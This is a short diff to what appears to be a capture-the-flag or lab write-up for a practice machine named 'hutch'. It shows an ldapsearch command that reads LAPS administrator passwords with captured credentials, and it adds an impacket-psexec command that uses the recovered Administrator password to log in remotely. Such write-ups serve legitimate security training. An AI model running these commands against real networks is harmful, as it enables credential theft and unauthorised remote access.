@@ -30,3 +30,7 @@ used to find the admin password
 ```
 ldapsearch -x -H ldap://192.168.105.122 -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd 
 ```
+used to log in to the machine.
+```
+impacket-psexec hutch.offsec/Administrator:'$az+c]64++F{$A'@192.168.105.122
+```
